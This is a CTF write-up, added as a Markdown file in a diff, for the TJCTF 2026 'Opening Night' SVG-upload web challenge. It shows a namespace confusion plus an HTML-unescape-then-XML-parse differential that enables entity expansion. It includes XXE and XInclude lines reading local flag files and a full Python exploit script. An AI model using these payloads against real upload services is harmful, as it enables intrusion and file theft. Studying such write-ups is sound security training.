@@ -1,0 +1,407 @@
+---
+title: "Web / Opening Night - TJCTF 2026"
+excerpt: "A writeup on the Web / Opening Night challenge from TJCTF 2026"
+category:
+  - "Writeups"
+tags:
+  - "CTF"
+  - "Web"
+  - "SVG"
+  - "XML"
+  - "Parser Differential"
+  - "Namespace Confusion"
+  - "Entity Expansion"
+  - "TJCTF"
+  - "2026"
+authors:
+    - "harshfeudal"
+---
+
+## The Challenge
+
+*opening-night*
+
+*Description*
+
+*The new gallery opens tonight.*
+
+*Instance: `https://opening-night-<instance>.tjc.tf` (link might be expired)*
+
+*Hint*
+
+*Two curators inspect each piece uploaded: one hangs the painting, and the other writes the label below.*  
+*The one who hangs it is careful; the one who writes the label, not quite.*
+
+*The gatekeeper only checks that your file looks like an SVG at the top.*  
+*The one who writes the label takes the first title/desc it sees by name, and not by the true namespace or intent.*  
+*Don't look for new rooms in the art gallery, just change how your art is presented and wrapped before it arrives!*
+
+*Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.*
+
+*The trick is not a hidden endpoint or browser JS execution. Keep your payload in the normal upload flow, and think about one stage decoding text before another stage parses XML metadata.*
+
+## The Walkthrough
+
+This challenge looked like a normal SVG upload challenge at first, but it was much more subtle than simply uploading an SVG and using XXE. The website acts like an art gallery: we upload an SVG, and the server displays the uploaded piece in a catalog with a title, a description, and the SVG size.
+
+A normal successful upload is rendered roughly like this:
+
+```html
+<article>
+  <div class="caption">
+    <h2>some title</h2>
+    <p>some description</p>
+    <dl>
+      <dt>Size</dt>
+      <dd>700 x 160</dd>
+    </dl>
+  </div>
+</article>
+```
+
+So the useful sinks are very limited: `<h2>` for the title, `<p>` for the description, and `<dd>` for the size.
+
+### First clue: the label parser ignores namespaces
+
+The hint says that the label writer takes the first `title` / `desc` it sees "by name", not by the real namespace or intent. So instead of only testing normal SVG metadata:
+
+```xml
+<title>SAFE_TITLE</title>
+<desc>SAFE_DESC</desc>
+```
+
+we can place fake metadata in a different namespace:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
+  <metadata>
+    <x:title xmlns:x="urn:not-svg">MARK_CUSTOM_TITLE</x:title>
+    <x:desc xmlns:x="urn:not-svg">MARK_CUSTOM_DESC</x:desc>
+  </metadata>
+
+  <title>SAFE_TITLE</title>
+  <desc>SAFE_DESC</desc>
+  <rect width="700" height="160" fill="white"/>
+</svg>
+```
+
+The server rendered:
+
+```text
+h2: 'MARK_CUSTOM_TITLE'
+p : 'MARK_CUSTOM_DESC'
+```
+
+That confirms the first bug. The cataloger does not require the SVG namespace. It is probably doing something like `find("title")` or `//*[local-name()="title"]`, instead of only accepting the real SVG nodes:
+
+```text
+{http://www.w3.org/2000/svg}title
+{http://www.w3.org/2000/svg}desc
+```
+
+This gives us control over the gallery label, but it is not enough for the flag yet.
+
+### Dead end 1: raw DOCTYPE does not expand in the label
+
+The obvious next idea was entity expansion. I tried a raw XML document with an internal entity:
+
+```xml
+<!DOCTYPE svg [
+  <!ENTITY e "ENTITY_OK">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
+  <metadata>
+    <x:title xmlns:x="urn:not-svg">&e;</x:title>
+    <x:desc xmlns:x="urn:not-svg">DESC</x:desc>
+  </metadata>
+</svg>
+```
+
+However, the output was:
+
+```text
+h2: '&e;'
+p : 'DESC'
+```
+
+In the normal raw-SVG path, the label parser does not expand the entity. This was an important trap: if we stop here, we may incorrectly assume that entity expansion is impossible in the challenge.
+
+### Dead end 2: external XXE and XInclude are blocked
+
+I also tried the usual external XXE payloads:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///flag">
+<!ENTITY xxe SYSTEM "file:///flag.txt">
+<!ENTITY xxe SYSTEM "file:///app/flag.txt">
+```
+
+They did not leak anything. I also tried OOB parameter entities with `webhook.site`, but the webhook never received a request. That means external entity loading is disabled.
+
+XInclude was also not processed:
+
+```xml
+<xi:include href="file:///flag" parse="text"/>
+```
+
+So this challenge is not a normal "read `/flag` with XXE" challenge.
+
+### Dead end 3: multipart confusion and SSTI are not the bug
+
+Because the hint mentions changing how the art is "wrapped" before it arrives, I also tested multipart confusion:
+
+* `piece` as a text field plus `piece` as a file field
+* duplicate `piece` file parts
+* `Content-Transfer-Encoding: quoted-printable`
+* `Content-Transfer-Encoding: base64`
+
+The app consistently used the real file part and ignored the text part. Base64 uploads were rejected by the intake desk.
+
+I also checked for SSTI by uploading a label containing:
+
+```text
+{{7*7}}
+```
+
+The response printed it literally, so SSTI was not involved.
+
+### The real primitive: full-file HTML-unescape before XML parsing
+
+The key hint is this sentence:
+
+> Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.
+
+The first almost-correct attempt was to place escaped XML inside `x:title`, but that fails when we need a `DOCTYPE`, because after decoding the `DOCTYPE` appears inside an element:
+
+```xml
+<x:title>
+  <!DOCTYPE svg [...]>
+  <svg>...</svg>
+</x:title>
+```
+
+In XML, `DOCTYPE` must appear in the document prolog, not inside another element.
+
+The correct trick is to HTML-escape the **entire XML document**.
+
+For example, this is the XML document that we want the second parser to see:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
+  <metadata>
+    <x:title xmlns:x="urn:not-svg">WHOLE_TITLE</x:title>
+    <x:desc xmlns:x="urn:not-svg">WHOLE_DESC</x:desc>
+  </metadata>
+  <rect width="100%" height="100%" fill="white"/>
+</svg>
+```
+
+But the file we actually upload is the same document escaped once:
+
+```html
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;700&quot; height=&quot;160&quot;&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_TITLE&lt;/x:title&gt;
+    &lt;x:desc xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;rect width=&quot;100%&quot; height=&quot;100%&quot; fill=&quot;white&quot;/&gt;
+&lt;/svg&gt;
+```
+
+The server accepts it and renders:
+
+```text
+h2: 'WHOLE_TITLE'
+p : 'WHOLE_DESC'
+dd: ['700 x 160']
+```
+
+That means one stage decodes the upload from HTML entities back into XML, and another stage parses the decoded XML as SVG metadata.
+
+### Final step: internal entity expansion in the decoded XML path
+
+Now we can put the `DOCTYPE` at the beginning of the decoded XML document, where it is valid.
+
+Before escaping, the XML is:
+
+```xml
+<!DOCTYPE svg [
+  <!ENTITY e "FINAL_ENTITY_OK">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
+  <metadata>
+    <x:title xmlns:x="urn:not-svg">&e;</x:title>
+    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
+  </metadata>
+  <title>SAFE</title>
+  <desc>SAFE</desc>
+  <rect width="100%" height="100%" fill="white"/>
+</svg>
+```
+
+The uploaded file is the entire XML document escaped once:
+
+```html
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY e &quot;FINAL_ENTITY_OK&quot;&gt;
+]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; ...
+```
+
+After the server decodes it, the XML parser sees a real document with a real `DOCTYPE`, expands the internal entity, and the challenge returns the flag.
+
+## Final Exploit
+
+```python
+#!/usr/bin/env python3
+import html
+import re
+import sys
+import time
+from urllib.parse import urljoin
+
+import requests
+
+BASE = sys.argv[1].strip("'\"").rstrip("/")
+FLAG_RE = re.compile(r"tjctf\{[^}]+\}", re.I)
+
+
+def find_form(session):
+    r = session.get(BASE + "/", timeout=20)
+
+    form = re.search(r"(?is)<form\b[^>]*>.*?</form>", r.text)
+    if not form:
+        return BASE + "/submit", "piece"
+
+    form = form.group(0)
+
+    action_m = re.search(r'''(?is)\baction=["']?([^"'\s>]*)''', form)
+    action = urljoin(BASE + "/", action_m.group(1) if action_m else "/submit")
+
+    field = "piece"
+    file_m = re.search(r'''(?is)<input\b[^>]*type=["']?file["']?[^>]*>''', form)
+    if file_m:
+        name_m = re.search(r'''(?is)\bname=["']([^"']+)["']''', file_m.group(0))
+        if name_m:
+            field = name_m.group(1)
+
+    return action, field
+
+
+def build_payload():
+    inner_xml = '''<!DOCTYPE svg [
+  <!ENTITY e "FINAL_ENTITY_OK">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
+  <metadata>
+    <x:title xmlns:x="urn:not-svg">&e;</x:title>
+    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
+  </metadata>
+  <title>SAFE</title>
+  <desc>SAFE</desc>
+  <rect width="100%" height="100%" fill="white"/>
+</svg>
+'''
+
+    # Critical: escape the whole XML document exactly once.
+    return html.escape(inner_xml, quote=True).encode()
+
+
+def main():
+    s = requests.Session()
+    action, field = find_form(s)
+
+    payload = build_payload()
+
+    for _ in range(10):
+        r = s.post(
+            action,
+            files={field: ("opening.svg", payload, "image/svg+xml")},
+            allow_redirects=True,
+            timeout=30,
+        )
+
+        wait = re.search(r"Try again in (\d+) seconds", r.text)
+        if wait:
+            t = int(wait.group(1)) + 1
+            print(f"[*] rate limited, sleeping {t}s")
+            time.sleep(t)
+            continue
+
+        m = FLAG_RE.search(r.text)
+        if m:
+            print("[+] FLAG:", m.group(0))
+            return
+
+        print("[!] No flag in response.")
+        print(r.text[:1000])
+        return
+
+    print("[!] Failed due to repeated rate limits.")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Run:
+
+```bash
+python3 solve.py 'https://opening-night-<instance>.tjc.tf'
+```
+
+Output:
+
+```text
+[+] FLAG: tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
+```
+
+## Why This Works
+
+The vulnerability is a parser differential between two stages.
+
+The first interpretation treats the upload as harmless HTML-escaped text:
+
+```html
+&lt;svg&gt;...&lt;/svg&gt;
+```
+
+The second interpretation decodes that text into XML:
+
+```xml
+<svg>...</svg>
+```
+
+Then the cataloger parses the decoded XML, expands the internal entity, and extracts the first `title` / `desc` by tag name only. Because it ignores namespaces, our `x:title` and `x:desc` are accepted as metadata.
+
+The whole flow is:
+
+```text
+HTML-escaped XML file
+        ↓ html.unescape()
+real XML document with DOCTYPE
+        ↓ XML parse with internal entity expansion
+x:title becomes FINAL_ENTITY_OK
+        ↓ challenge success condition
+flag
+```
+
+## Final Words
+
+This was a very nice web challenge because the intended trick was not just "upload SVG and do XXE". Raw XXE, external entities, XInclude, webhook exfiltration, multipart confusion, and SSTI all failed.
+
+The real bug was the combination of:
+
+1. namespace-insensitive metadata extraction;
+2. decoding the uploaded content before parsing it as XML;
+3. internal entity expansion in the decoded XML path.
+
+Once the `DOCTYPE` is placed at the start of the decoded document, the internal entity expansion works and the flag appears.
+
+```
+tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
+```
+
+"Ein schlechter Handwerker gibt seinen Werkzeugen die Schuld." - Don't blame ChatGPT if you cannot solve :D
+
+<img src="image.png" alt="image.png" style="width: 30%; height: auto;" />
